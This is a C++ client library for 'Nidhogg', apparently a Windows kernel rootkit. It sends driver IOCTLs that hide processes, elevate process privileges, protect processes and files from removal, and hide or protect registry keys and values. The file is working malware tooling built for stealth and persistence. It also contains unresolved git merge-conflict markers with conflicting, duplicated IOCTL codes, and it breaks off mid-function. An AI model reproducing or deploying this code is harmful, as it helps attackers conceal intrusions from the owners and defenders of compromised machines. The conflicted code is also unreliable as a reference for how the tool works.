#include <windows.h>
#include <vector>
#include <sddl.h>
#pragma comment(lib, "advapi32.lib")

<<<<<<< HEAD
// ** IOCTL ************************************************************************************
=======
// ** IOCTL *************************************************************************************************
>>>>>>> 0a9676d (Pre version 0.1 (#6))
#define IOCTL_NIDHOGG_PROTECT_PROCESS CTL_CODE(0x8000, 0x800, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_NIDHOGG_UNPROTECT_PROCESS CTL_CODE(0x8000, 0x801, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_NIDHOGG_CLEAR_PROCESS_PROTECTION CTL_CODE(0x8000, 0x802, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_NIDHOGG_HIDE_PROCESS CTL_CODE(0x8000, 0x803, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_NIDHOGG_ELEVATE_PROCESS CTL_CODE(0x8000, 0x804, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_NIDHOGG_QUERY_PROCESSES CTL_CODE(0x8000, 0x805, METHOD_BUFFERED, FILE_ANY_ACCESS)

<<<<<<< HEAD
#define IOCTL_NIDHOGG_PROTECT_FILE CTL_CODE(0x8000, 0x806, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_NIDHOGG_UNPROTECT_FILE CTL_CODE(0x8000, 0x807, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_NIDHOGG_CLEAR_FILE_PROTECTION CTL_CODE(0x8000, 0x808, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_NIDHOGG_QUERY_FILES CTL_CODE(0x8000, 0x809, METHOD_BUFFERED, FILE_ANY_ACCESS)

<<<<<<< HEAD
#define IOCTL_NIDHOGG_PROTECT_REGITEM CTL_CODE(0x8000, 0x809, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_NIDHOGG_UNPROTECT_REGITEM CTL_CODE(0x8000, 0x80A, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_NIDHOGG_CLEAR_REGITEMS CTL_CODE(0x8000, 0x80B, METHOD_BUFFERED, FILE_ANY_ACCESS)
=======
#define IOCTL_NIDHOGG_PROTECT_FILE CTL_CODE(0x8000, 0x805, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_NIDHOGG_UNPROTECT_FILE CTL_CODE(0x8000, 0x806, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_NIDHOGG_CLEAR_FILE_PROTECTION CTL_CODE(0x8000, 0x807, METHOD_BUFFERED, FILE_ANY_ACCESS)

#define IOCTL_NIDHOGG_PROTECT_REGITEM CTL_CODE(0x8000, 0x808, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_NIDHOGG_UNPROTECT_REGITEM CTL_CODE(0x8000, 0x809, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_NIDHOGG_CLEAR_REGITEMS CTL_CODE(0x8000, 0x80A, METHOD_BUFFERED, FILE_ANY_ACCESS)
>>>>>>> 0a9676d (Pre version 0.1 (#6))
=======
#define IOCTL_NIDHOGG_PROTECT_REGITEM CTL_CODE(0x8000, 0x80A, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_NIDHOGG_UNPROTECT_REGITEM CTL_CODE(0x8000, 0x80B, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_NIDHOGG_CLEAR_REGITEMS CTL_CODE(0x8000, 0x80C, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_NIDHOGG_QUERY_REGITEMS CTL_CODE(0x8000, 0x80D, METHOD_BUFFERED, FILE_ANY_ACCESS)
>>>>>>> 9256dee (Added ability to query registry, processes and files)
// *********************************************************************************************************

// ** General Definitions ***************************************************************************************
#define DRIVER_NAME LR"(\\.\Nidhogg)"
#define NIDHOGG_SUCCESS 0
#define NIDHOGG_GENERAL_ERROR 1
#define NIDHOGG_ERROR_CONNECT_DRIVER 2
#define NIDHOGG_ERROR_DEVICECONTROL_DRIVER 3

<<<<<<< HEAD
#define MAX_PIDS 256
#define MAX_FILES 256

<<<<<<< HEAD
=======
>>>>>>> 0a9676d (Pre version 0.1 (#6))
#define REG_TYPE_KEY 0
#define REG_TYPE_VALUE 1
=======
#define REG_TYPE_PROTECTED_KEY 0
#define REG_TYPE_PROTECTED_VALUE 1
#define REG_TYPE_HIDDEN_KEY 2
#define REG_TYPE_HIDDEN_VALUE 3
>>>>>>> c5ff028 (Seperated hidden and protected registry items)
#define REG_KEY_LEN 255
#define REG_VALUE_LEN 260
#define HKLM_HIVE LR"(\Registry\Machine)"
#define HKCR_HIVE LR"(\Registry\Machine\SOFTWARE\Classes)"
#define HKU_HIVE LR"(\Registry\User)"
#define HKLM L"HKEY_LOCAL_MACHINE"
#define HKLM_SHORT L"HKLM"
#define HKU L"HKEY_USERS"
#define HKU_SHORT L"HKU"
#define HKCU L"HKEY_CURRENT_USER"
#define HKCU_SHORT L"HKCU"
#define HKCR L"HKEY_CLASSES_ROOT"
#define HKCR_SHORT L"HKCR"
// *********************************************************************************************************

// ** General Structures ***************************************************************************************
<<<<<<< HEAD
struct ProcessesList {
    int PidsCount;
    ULONG Pids[MAX_PIDS];
};

<<<<<<< HEAD
=======
>>>>>>> 0a9676d (Pre version 0.1 (#6))
=======
struct FileItem {
    int FileIndex;
    WCHAR FilePath[MAX_PATH];
};

>>>>>>> 9256dee (Added ability to query registry, processes and files)
struct RegItem {
    int RegItemsIndex;
    ULONG Type;
    WCHAR KeyPath[REG_KEY_LEN];
    WCHAR ValueName[REG_VALUE_LEN];
};
// *********************************************************************************************************


std::wstring GetHKCUPath() {
    std::wstring fullUsername = HKU_HIVE;
    WCHAR username[MAX_PATH];
    DWORD usernameSize = MAX_PATH;
    wchar_t* domain;
    SID* sid;
    LPWSTR stringSid;
    SID_NAME_USE sidUse;
    DWORD sidSize = 0;
    DWORD domainSize = 0;

    if (!GetUserName(username, &usernameSize)) {
        return fullUsername;
    }

    if (LookupAccountName(0, username, 0, &sidSize, 0, &domainSize, &sidUse) == 0) {
        if (GetLastError() != ERROR_INSUFFICIENT_BUFFER)
            return fullUsername;
    }

    sid = (SID*)LocalAlloc(LMEM_FIXED, sidSize);

    if (sid == 0) {
        return fullUsername;
    }
    domain = (wchar_t*)LocalAlloc(LMEM_FIXED, domainSize);

    if (domain == 0) {
        LocalFree(sid);
        return fullUsername;
    }

    if (LookupAccountName(0, username, sid, &sidSize, (LPWSTR)domain, &domainSize, &sidUse) == 0) {
        LocalFree(sid);
        LocalFree(domain);
        return fullUsername;
    }

    if (!ConvertSidToStringSid(sid, &stringSid)) {
        LocalFree(sid);
        LocalFree(domain);
        return fullUsername;
    }

    LocalFree(sid);
    LocalFree(domain);

    fullUsername.append(L"\\");
    fullUsername.append(stringSid);
    return fullUsername;
}

std::wstring ParseRegistryKey(wchar_t* key) {
    std::wstring result = key;

    if (result.find(HKLM) != std::wstring::npos) {
        result.replace(0, 18, HKLM_HIVE);
    }
    else if (result.find(HKLM_SHORT) != std::wstring::npos) {
        result.replace(0, 4, HKLM_HIVE);
    }
    else if (result.find(HKCR) != std::wstring::npos) {
        result.replace(0, 17, HKCR_HIVE);
    }
    else if (result.find(HKCR_SHORT) != std::wstring::npos) {
        result.replace(0, 4, HKCR_HIVE);
    }
    else if (result.find(HKU) != std::wstring::npos) {
        result.replace(0, 10, HKU_HIVE);
    }
    else if (result.find(HKU_SHORT) != std::wstring::npos) {
        result.replace(0, 3, HKU_HIVE);
    }
    else if (result.find(HKCU) != std::wstring::npos) {
        std::wstring hkcuPath = GetHKCUPath();

        if (hkcuPath.compare(HKU_HIVE) == 0)
            return L"";
        result.replace(0, 17, hkcuPath);
    }
    else if (result.find(HKCU_SHORT) != std::wstring::npos) {
        std::wstring hkcuPath = GetHKCUPath();

        if (hkcuPath.compare(HKU_HIVE) == 0)
            return L"";
        result.replace(0, 4, hkcuPath);
    }
    else {
        return L"";
    }
    return result;
}

int NidhoggProcessProtect(DWORD pid) {
    DWORD returned;
    HANDLE hFile = CreateFile(DRIVER_NAME, GENERIC_WRITE | GENERIC_READ, 0, nullptr, OPEN_EXISTING, 0, nullptr);

    if (hFile == INVALID_HANDLE_VALUE)
        return NIDHOGG_ERROR_CONNECT_DRIVER;

    if (!DeviceIoControl(hFile, IOCTL_NIDHOGG_PROTECT_PROCESS,
        &pid, sizeof(pid),
        nullptr, 0, &returned, nullptr)) {
        CloseHandle(hFile);
        return NIDHOGG_ERROR_DEVICECONTROL_DRIVER;
    }

    CloseHandle(hFile);
    return NIDHOGG_SUCCESS;
}

int NidhoggProcessUnprotect(DWORD pid) {
    DWORD returned;
    HANDLE hFile = CreateFile(DRIVER_NAME, GENERIC_WRITE | GENERIC_READ, 0, nullptr, OPEN_EXISTING, 0, nullptr);

    if (hFile == INVALID_HANDLE_VALUE)
        return NIDHOGG_ERROR_CONNECT_DRIVER;

    if (!DeviceIoControl(hFile, IOCTL_NIDHOGG_UNPROTECT_PROCESS,
        &pid, sizeof(pid),
        nullptr, 0, &returned, nullptr)) {

        CloseHandle(hFile);
        return NIDHOGG_ERROR_DEVICECONTROL_DRIVER;
    }

    CloseHandle(hFile);
    return NIDHOGG_SUCCESS;
}

int NidhoggProcessClearAllProtection() {
    DWORD returned;
    HANDLE hFile = CreateFile(DRIVER_NAME, GENERIC_WRITE | GENERIC_READ, 0, nullptr, OPEN_EXISTING, 0, nullptr);

    if (hFile == INVALID_HANDLE_VALUE)
        return NIDHOGG_ERROR_CONNECT_DRIVER;

    if (!DeviceIoControl(hFile, IOCTL_NIDHOGG_CLEAR_PROCESS_PROTECTION,
        nullptr, 0, nullptr, 0, &returned, nullptr)) {
        CloseHandle(hFile);
        return NIDHOGG_ERROR_DEVICECONTROL_DRIVER;
    }

    CloseHandle(hFile);
    return NIDHOGG_SUCCESS;
}

int NidhoggProcessHide(DWORD pid) {
    DWORD returned;
    HANDLE hFile = CreateFile(DRIVER_NAME, GENERIC_WRITE | GENERIC_READ, 0, nullptr, OPEN_EXISTING, 0, nullptr);

    if (hFile == INVALID_HANDLE_VALUE)
        return NIDHOGG_ERROR_CONNECT_DRIVER;

    if (!DeviceIoControl(hFile, IOCTL_NIDHOGG_HIDE_PROCESS,
        &pid, sizeof(pid),
        nullptr, 0, &returned, nullptr)) {

        CloseHandle(hFile);
        return NIDHOGG_ERROR_DEVICECONTROL_DRIVER;
    }

    CloseHandle(hFile);
    return NIDHOGG_SUCCESS;
}

int NidhoggProcessElevate(DWORD pid) {
    DWORD returned;
    HANDLE hFile = CreateFile(DRIVER_NAME, GENERIC_WRITE | GENERIC_READ, 0, nullptr, OPEN_EXISTING, 0, nullptr);

    if (hFile == INVALID_HANDLE_VALUE)
        return NIDHOGG_ERROR_CONNECT_DRIVER;

    if (!DeviceIoControl(hFile, IOCTL_NIDHOGG_ELEVATE_PROCESS,
        &pid, sizeof(pid),
        nullptr, 0, &returned, nullptr)) {

        CloseHandle(hFile);
        return NIDHOGG_ERROR_DEVICECONTROL_DRIVER;
    }

    CloseHandle(hFile);
    return NIDHOGG_SUCCESS;
}

std::vector<DWORD> NidhoggQueryProcesses() {
    ProcessesList result{};
    std::vector<DWORD> pids;
    DWORD returned;

    HANDLE hFile = CreateFile(DRIVER_NAME, GENERIC_WRITE | GENERIC_READ, 0, nullptr, OPEN_EXISTING, 0, nullptr);

    if (hFile == INVALID_HANDLE_VALUE) {
        pids.push_back(NIDHOGG_ERROR_CONNECT_DRIVER);
        return pids;
    }

    if (!DeviceIoControl(hFile, IOCTL_NIDHOGG_QUERY_PROCESSES,
        nullptr, 0,
        &result, sizeof(result), &returned, nullptr)) {
        pids.push_back(NIDHOGG_ERROR_DEVICECONTROL_DRIVER);
        CloseHandle(hFile);
        return pids;
    }

    for (int i = 0; i < result.PidsCount; i++) {
        pids.push_back(result.Pids[i]);
    }

    CloseHandle(hFile);
    return pids;
}

int NidhoggFileProtect(wchar_t* filePath) {
    DWORD returned;
    HANDLE hFile = CreateFile(DRIVER_NAME, GENERIC_WRITE | GENERIC_READ, 0, nullptr, OPEN_EXISTING, 0, nullptr);

    if (hFile == INVALID_HANDLE_VALUE)
        return NIDHOGG_ERROR_CONNECT_DRIVER;

    if (!DeviceIoControl(hFile, IOCTL_NIDHOGG_PROTECT_FILE,
        (PVOID)filePath, ((DWORD)(wcslen(filePath) + 1)) * sizeof(WCHAR),
        nullptr, 0, &returned, nullptr)) {
        CloseHandle(hFile);
        return NIDHOGG_ERROR_DEVICECONTROL_DRIVER;
    }


    CloseHandle(hFile);
    return NIDHOGG_SUCCESS;
}

int NidhoggFileUnprotect(wchar_t* filePath) {
    DWORD returned;
    HANDLE hFile = CreateFile(DRIVER_NAME, GENERIC_WRITE | GENERIC_READ, 0, nullptr, OPEN_EXISTING, 0, nullptr);

    if (hFile == INVALID_HANDLE_VALUE)
        return NIDHOGG_ERROR_CONNECT_DRIVER;

    if (!DeviceIoControl(hFile, IOCTL_NIDHOGG_UNPROTECT_FILE,
        (PVOID)filePath, ((DWORD)(wcslen(filePath) + 1)) * sizeof(WCHAR),
        nullptr, 0, &returned, nullptr)) {

        CloseHandle(hFile);
        return NIDHOGG_ERROR_DEVICECONTROL_DRIVER;
    }

    CloseHandle(hFile);
    return NIDHOGG_SUCCESS;
}

int NidhoggFileClearAllProtection() {
    DWORD returned;
    HANDLE hFile = CreateFile(DRIVER_NAME, GENERIC_WRITE | GENERIC_READ, 0, nullptr, OPEN_EXISTING, 0, nullptr);

    if (hFile == INVALID_HANDLE_VALUE)
        return NIDHOGG_ERROR_CONNECT_DRIVER;

    if (!DeviceIoControl(hFile, IOCTL_NIDHOGG_CLEAR_FILE_PROTECTION,
        nullptr, 0, nullptr, 0, &returned, nullptr)) {
        CloseHandle(hFile);
        return NIDHOGG_ERROR_DEVICECONTROL_DRIVER;
    }

    CloseHandle(hFile);
    return NIDHOGG_SUCCESS;
}

std::vector<std::wstring> NidhoggQueryFiles() {
    FileItem result{};
    std::vector<std::wstring> files;
    int amountOfFiles = 0;
    DWORD returned;

    HANDLE hFile = CreateFile(DRIVER_NAME, GENERIC_WRITE | GENERIC_READ, 0, nullptr, OPEN_EXISTING, 0, nullptr);

    if (hFile == INVALID_HANDLE_VALUE) {
        files.push_back(std::to_wstring(NIDHOGG_ERROR_CONNECT_DRIVER));
        return files;
    }
    result.FileIndex = 0;

    if (!DeviceIoControl(hFile, IOCTL_NIDHOGG_QUERY_FILES,
        nullptr, 0,
        &result, sizeof(result), &returned, nullptr)) {
        files.push_back(std::to_wstring(NIDHOGG_ERROR_DEVICECONTROL_DRIVER));
        CloseHandle(hFile);
        return files;
    }

    amountOfFiles = result.FileIndex;

    if (amountOfFiles == 0)
        return files;

    files.push_back(std::wstring(result.FilePath));
    result.FilePath[0] = L'\0';

    for (int i = 1; i < amountOfFiles; i++) {
        result.FileIndex = i;

        if (!DeviceIoControl(hFile, IOCTL_NIDHOGG_QUERY_FILES,
            nullptr, 0,
            &result, sizeof(result), &returned, nullptr)) {
            files.clear();
            files.push_back(std::to_wstring(NIDHOGG_ERROR_DEVICECONTROL_DRIVER));
            CloseHandle(hFile);
            return files;
        }
        
        files.push_back(std::wstring(result.FilePath));
        result.FilePath[0] = L'\0';
    }
    
    CloseHandle(hFile);
    return files;
}

int NidhoggRegistryProtectKey(wchar_t* key) {
    HANDLE hFile;
    DWORD returned;
    RegItem item;
    std::wstring kernelSyntaxRegistryKey = ParseRegistryKey(key);

    if (kernelSyntaxRegistryKey.empty()) {
        return NIDHOGG_GENERAL_ERROR;
    }
  
    hFile = CreateFile(DRIVER_NAME, GENERIC_WRITE | GENERIC_READ, 0, nullptr, OPEN_EXISTING, 0, nullptr);

    if (hFile == INVALID_HANDLE_VALUE)
        return NIDHOGG_ERROR_CONNECT_DRIVER;

    wcscpy_s(item.KeyPath, wcslen(kernelSyntaxRegistryKey.data()) + 1, kernelSyntaxRegistryKey.data());
    item.Type = REG_TYPE_PROTECTED_KEY;

    if (!DeviceIoControl(hFile, IOCTL_NIDHOGG_PROTECT_REGITEM,
        &item, sizeof(item),
        nullptr, 0, &returned, nullptr)) {

        CloseHandle(hFile);
        return NIDHOGG_ERROR_DEVICECONTROL_DRIVER;
    }

    CloseHandle(hFile);
    return NIDHOGG_SUCCESS;
}

int NidhoggRegistryHideKey(wchar_t* key) {
    HANDLE hFile;
    DWORD returned;
    RegItem item;
    std::wstring kernelSyntaxRegistryKey = ParseRegistryKey(key);

    if (kernelSyntaxRegistryKey.empty()) {
        return NIDHOGG_GENERAL_ERROR;
    }

    hFile = CreateFile(DRIVER_NAME, GENERIC_WRITE | GENERIC_READ, 0, nullptr, OPEN_EXISTING, 0, nullptr);

    if (hFile == INVALID_HANDLE_VALUE)
        return NIDHOGG_ERROR_CONNECT_DRIVER;

    wcscpy_s(item.KeyPath, wcslen(kernelSyntaxRegistryKey.data()) + 1, kernelSyntaxRegistryKey.data());
    item.Type = REG_TYPE_HIDDEN_KEY;

    if (!DeviceIoControl(hFile, IOCTL_NIDHOGG_PROTECT_REGITEM,
        &item, sizeof(item),
        nullptr, 0, &returned, nullptr)) {

        CloseHandle(hFile);
        return NIDHOGG_ERROR_DEVICECONTROL_DRIVER;
    }

    CloseHandle(hFile);
    return NIDHOGG_SUCCESS;
}

int NidhoggRegistryProtectValue(wchar_t* key, wchar_t* valueName) {
    HANDLE hFile;
    DWORD returned;
    RegItem item;
    std::wstring kernelSyntaxRegistryKey = ParseRegistryKey(key);

    if (kernelSyntaxRegistryKey.empty()) {
        return NIDHOGG_GENERAL_ERROR;
    }

    hFile = CreateFile(DRIVER_NAME, GENERIC_WRITE | GENERIC_READ, 0, nullptr, OPEN_EXISTING, 0, nullptr);

    if (hFile == INVALID_HANDLE_VALUE)
        return NIDHOGG_ERROR_CONNECT_DRIVER;

    wcscpy_s(item.KeyPath, wcslen(kernelSyntaxRegistryKey.data()) + 1, kernelSyntaxRegistryKey.data());
    wcscpy_s(item.ValueName, wcslen(valueName) + 1, valueName);
    item.Type = REG_TYPE_PROTECTED_VALUE;

    if (!DeviceIoControl(hFile, IOCTL_NIDHOGG_PROTECT_REGITEM,
        &item, sizeof(item),
        nullptr, 0, &returned, nullptr)) {

        CloseHandle(hFile);
        return NIDHOGG_ERROR_DEVICECONTROL_DRIVER;
    }


    CloseHandle(hFile);
    return NIDHOGG_SUCCESS;
}

int NidhoggRegistryHideValue(wchar_t* key, wchar_t* valueName) {
    HANDLE hFile;
    DWORD returned;
    RegItem item;
    std::wstring kernelSyntaxRegistryKey = ParseRegistryKey(key);

    if (kernelSyntaxRegistryKey.empty()) {
        return NIDHOGG_GENERAL_ERROR;
    }

    hFile = CreateFile(DRIVER_NAME, GENERIC_WRITE | GENERIC_READ, 0, nullptr, OPEN_EXISTING, 0, nullptr);

    if (hFile == INVALID_HANDLE_VALUE)
        return NIDHOGG_ERROR_CONNECT_DRIVER;

    wcscpy_s(item.KeyPath, wcslen(kernelSyntaxRegistryKey.data()) + 1, kernelSyntaxRegistryKey.data());
    wcscpy_s(item.ValueName, wcslen(valueName) + 1, valueName);
    item.Type = REG_TYPE_HIDDEN_VALUE;

    if (!DeviceIoControl(hFile, IOCTL_NIDHOGG_PROTECT_REGITEM,
        &item, sizeof(item),
        nullptr, 0, &returned, nullptr)) {

        CloseHandle(hFile);
        return NIDHOGG_ERROR_DEVICECONTROL_DRIVER;
    }


    CloseHandle(hFile);
    return NIDHOGG_SUCCESS;
}

int NidhoggRegistryUnprotectKey(wchar_t* key) {
    HANDLE hFile;
    DWORD returned;
    RegItem item;
    std::wstring kernelSyntaxRegistryKey = ParseRegistryKey(key);

    if (kernelSyntaxRegistryKey.empty()) {
        return NIDHOGG_GENERAL_ERROR;
    }

    hFile = CreateFile(DRIVER_NAME, GENERIC_WRITE | GENERIC_READ, 0, nullptr, OPEN_EXISTING, 0, nullptr);

    if (hFile == INVALID_HANDLE_VALUE)
        return NIDHOGG_ERROR_CONNECT_DRIVER;

    wcscpy_s(item.KeyPath, wcslen(kernelSyntaxRegistryKey.data()) + 1, kernelSyntaxRegistryKey.data());
    item.Type = REG_TYPE_PROTECTED_KEY;

    if (!DeviceIoControl(hFile, IOCTL_NIDHOGG_UNPROTECT_REGITEM,
        &item, sizeof(item),
        nullptr, 0, &returned, nullptr)) {

        CloseHandle(hFile);
        return NIDHOGG_ERROR_DEVICECONTROL_DRIVER;
    }

    CloseHandle(hFile);
    return NIDHOGG_SUCCESS;
}

int NidhoggRegistryUnhideKey(wchar_t* key) {
    HANDLE hFile;
    DWORD returned;
    RegItem item;
    std::wstring kernelSyntaxRegistryKey = ParseRegistryKey(key);

    if (kernelSyntaxRegistryKey.empty()) {
        return NIDHOGG_GENERAL_ERROR;
    }

    hFile = CreateFile(DRIVER_NAME, GENERIC_WRITE | GENERIC_READ, 0, nullptr, OPEN_EXISTING, 0, nullptr);

    if (hFile == INVALID_HANDLE_VALUE)
        return NIDHOGG_ERROR_CONNECT_DRIVER;

    wcscpy_s(item.KeyPath, wcslen(kernelSyntaxRegistryKey.data()) + 1, kernelSyntaxRegistryKey.data());
    item.Type = REG_TYPE_HIDDEN_KEY;

    if (!DeviceIoControl(hFile, IOCTL_NIDHOGG_UNPROTECT_REGITEM,
        &item, sizeof(item),
        nullptr, 0, &returned, nullptr)) {

        CloseHandle(hFile);
        return NIDHOGG_ERROR_DEVICECONTROL_DRIVER;
    }

    return NIDHOGG_SUCCESS;
}

int NidhoggRegistryUnprotectValue(wchar_t* key, wchar_t* valueName) {
    HANDLE hFile;
    DWORD returned;
    RegItem item;
    std::wstring kernelSyntaxRegistryKey = ParseRegistryKey(key);

    if (kernelSyntaxRegistryKey.empty()) {
        return NIDHOGG_GENERAL_ERROR;
    }

    hFile = CreateFile(DRIVER_NAME, GENERIC_WRITE | GENERIC_READ, 0, nullptr, OPEN_EXISTING, 0, nullptr);

    if (hFile == INVALID_HANDLE_VALUE)
        return NIDHOGG_ERROR_CONNECT_DRIVER;

    wcscpy_s(item.KeyPath, wcslen(kernelSyntaxRegistryKey.data()) + 1, kernelSyntaxRegistryKey.data());
    wcscpy_s(item.ValueName, wcslen(valueName) + 1, valueName);
    item.Type = REG_TYPE_PROTECTED_VALUE;

    if (!DeviceIoControl(hFile, IOCTL_NIDHOGG_UNPROTECT_REGITEM,
        &item, sizeof(item),
        nullptr, 0, &returned, nullptr)) {

        CloseHandle(hFile);
        return NIDHOGG_ERROR_DEVICECONTROL_DRIVER;
    }

    CloseHandle(hFile);
    return NIDHOGG_SUCCESS;
}

int NidhoggRegistryUnhideValue(wchar_t* key, wchar_t* valueName) {
    HANDLE hFile;
    DWORD returned;
    RegItem item;
    std::wstring kernelSyntaxRegistryKey = ParseRegistryKey(key);

    if (kernelSyntaxRegistryKey.empty()) {
        return NIDHOGG_GENERAL_ERROR;
    }

    hFile = CreateFile(DRIVER_NAME, GENERIC_WRITE | GENERIC_READ, 0, nullptr, OPEN_EXISTING, 0, nullptr);

    if (hFile == INVALID_HANDLE_VALUE)
        return NIDHOGG_ERROR_CONNECT_DRIVER;

    wcscpy_s(item.KeyPath, wcslen(kernelSyntaxRegistryKey.data()) + 1, kernelSyntaxRegistryKey.data());
    wcscpy_s(item.ValueName, wcslen(valueName) + 1, valueName);
    item.Type = REG_TYPE_HIDDEN_VALUE;

    if (!DeviceIoControl(hFile, IOCTL_NIDHOGG_UNPROTECT_REGITEM,
        &item, sizeof(item),
        nullptr, 0, &returned, nullptr)) {

        CloseHandle(hFile);
        return NIDHOGG_ERROR_DEVICECONTROL_DRIVER;
    }

    CloseHandle(hFile);
    return NIDHOGG_SUCCESS;
}

int NidhoggRegistryClearAll() {
    DWORD returned;
    HANDLE hFile = CreateFile(DRIVER_NAME, GENERIC_WRITE | GENERIC_READ, 0, nullptr, OPEN_EXISTING, 0, nullptr);

    if (hFile == INVALID_HANDLE_VALUE)
        return NIDHOGG_ERROR_CONNECT_DRIVER;

    if (!DeviceIoControl(hFile, IOCTL_NIDHOGG_CLEAR_REGITEMS,
        nullptr, 0, nullptr, 0, &returned, nullptr)) {
        CloseHandle(hFile);
        return NIDHOGG_ERROR_DEVICECONTROL_DRIVER;
    }

    CloseHandle(hFile);
    return NIDHOGG_SUCCESS;
}

std::vector<std::wstring> NidhoggRegistryQueryProtectedKeys() {
    RegItem result{};
    std::vector<std::wstring> keys;
    int amountOfKeys = 0;
    DWORD returned;

    HANDLE hFile = CreateFile(DRIVER_NAME, GENERIC_WRITE | GENERIC_READ, 0, nullptr, OPEN_EXISTING, 0, nullptr);

    if (hFile == INVALID_HANDLE_VALUE) {
        keys.push_back(std::to_wstring(NIDHOGG_ERROR_CONNECT_DRIVER));
        return keys;
    }
    result.RegItemsIndex = 0;
    result.Type = REG_TYPE_PROTECTED_KEY;

    if (!DeviceIoControl(hFile, IOCTL_NIDHOGG_QUERY_REGITEMS,
        &result, sizeof(result),
        &result, sizeof(result), &returned, nullptr)) {
        keys.push_back(std::to_wstring(NIDHOGG_ERROR_DEVICECONTROL_DRIVER));
        CloseHandle(hFile);
        return keys;
    }

    amountOfKeys = result.RegItemsIndex;

    if (amountOfKeys == 0)
        return keys;

    keys.push_back(std::wstring(result.KeyPath));
    result.KeyPath[0] = L'\0';

    for (int i = 1; i < amountOfKeys; i++) {
        result.RegItemsIndex = i;

        if (!DeviceIoControl(hFile, IOCTL_NIDHOGG_QUERY_REGITEMS,
            nullptr, 0,
            &result, sizeof(result), &returned, nullptr)) {
            keys.clear();
            keys.push_back(std::to_wstring(NIDHOGG_ERROR_DEVICECONTROL_DRIVER));
            CloseHandle(hFile);
            return keys;
        }

        keys.push_back(std::wstring(result.KeyPath));
        result.KeyPath[0] = L'\0';
    }

    CloseHandle(hFile);
    return keys;
}

std::vector<std::wstring> NidhoggRegistryQueryHiddenKeys() {
    RegItem result{};
    std::vector<std::wstring> keys;
    int amountOfKeys = 0;
    DWORD returned;

    HANDLE hFile = CreateFile(DRIVER_NAME, GENERIC_WRITE | GENERIC_READ, 0, nullptr, OPEN_EXISTING, 0, nullptr);

    if (hFile == INVALID_HANDLE_VALUE) {
        keys.push_back(std::to_wstring(NIDHOGG_ERROR_CONNECT_DRIVER));
        return keys;
    }
    result.RegItemsIndex = 0;
    result.Type = REG_TYPE_HIDDEN_KEY;

    if (!DeviceIoControl(hFile, IOCTL_NIDHOGG_QUERY_REGITEMS,
        &result, sizeof(result),
        &result, sizeof(result), &returned, nullptr)) {
        keys.push_back(std::to_wstring(NIDHOGG_ERROR_DEVICECONTROL_DRIVER));
        CloseHandle(hFile);
        return keys;
    }

    amountOfKeys = result.RegItemsIndex;

    if (amountOfKeys == 0)
        return keys;

    keys.push_back(std::wstring(result.KeyPath));
    result.KeyPath[0] = L'\0';

    for (int i = 1; i < amountOfKeys; i++) {
        result.RegItemsIndex = i;

        if (!DeviceIoControl(hFile, IOCTL_NIDHOGG_QUERY_REGITEMS,
            nullptr, 0,
            &result, sizeof(result), &returned, nullptr)) {
            keys.clear();
            keys.push_back(std::to_wstring(NIDHOGG_ERROR_DEVICECONTROL_DRIVER));
            CloseHandle(hFile);
            return keys;
        }

        keys.push_back(std::wstring(result.KeyPath));
        result.KeyPath[0] = L'\0';
    }

    CloseHandle(hFile);
    return keys;
}

std::tuple<std::vector<std::wstring>, std::vector<std::wstring>> NidhoggRegistryQueryProtectedValues() {
    RegItem result{};
    std::vector<std::wstring> values;
    std::vector<std::wstring> valuesKeys;
    int amountOfValues = 0;
    DWORD returned;

    HANDLE hFile = CreateFile(DRIVER_NAME, GENERIC_WRITE | GENERIC_READ, 0, nullptr, OPEN_EXISTING, 0, nullptr);

    if (hFile == INVALID_HANDLE_VALUE) {
        values.push_back(std::to_wstring(NIDHOGG_ERROR_CONNECT_DRIVER));
        return { values, valuesKeys };
    }

    result.RegItemsIndex = 0;
    result.Type = REG_TYPE_PROTECTED_VALUE;

    if (!DeviceIoControl(hFile, IOCTL_NIDHOGG_QUERY_REGITEMS,
        &result, sizeof(result),
        &result, sizeof(result), &returned, nullptr)) {
        values.clear();
        values.push_back(std::to_wstring(NIDHOGG_ERROR_DEVICECONTROL_DRIVER));
        CloseHandle(hFile);
        return { values, valuesKeys};
    }

    amountOfValues = result.RegItemsIndex;

    if (amountOfValues == 0)
        return { values, valuesKeys };

    valuesKeys.push_back(std::wstring(result.KeyPath));
    values.push_back(std::wstring(result.ValueName));
    result.KeyPath[0] = L'\0';
    result.ValueName[0] = L'\0';

    for (int i = 1; i < amountOfValues; i++) {
        result.RegItemsIndex = i;

        if (!DeviceIoControl(hFile, IOCTL_NIDHOGG_QUERY_REGITEMS,
            nullptr, 0,
            &result, sizeof(result), &returned, nullptr)) {
            values.clear();
            valuesKeys.clear();
            values.push_back(std::to_wstring(NIDHOGG_ERROR_DEVICECONTROL_DRIVER));
            CloseHandle(hFile);
            return { values, valuesKeys };
        }

        valuesKeys.push_back(std::wstring(result.KeyPath));
        values.push_back(std::wstring(result.ValueName));
        result.KeyPath[0] = L'\0';
        result.ValueName[0] = L'\0';
    }

    CloseHandle(hFile);
    return { values, valuesKeys };
}

std::tuple<std::vector<std::wstring>, std::vector<std::wstring>> NidhoggRegistryQueryHiddenValues() {
    RegItem result{};
    std::vector<std::wstring> values;
    std::vector<std::wstring> valuesKeys;
    int amountOfValues = 0;
    DWORD returned;

    HANDLE hFile = CreateFile(DRIVER_NAME, GENERIC_WRITE | GENERIC_READ, 0, nullptr, OPEN_EXISTING, 0, nullptr);

    if (hFile == INVALID_HANDLE_VALUE) {
        values.push_back(std::to_wstring(NIDHOGG_ERROR_CONNECT_DRIVER));
        return { values, valuesKeys };
    }

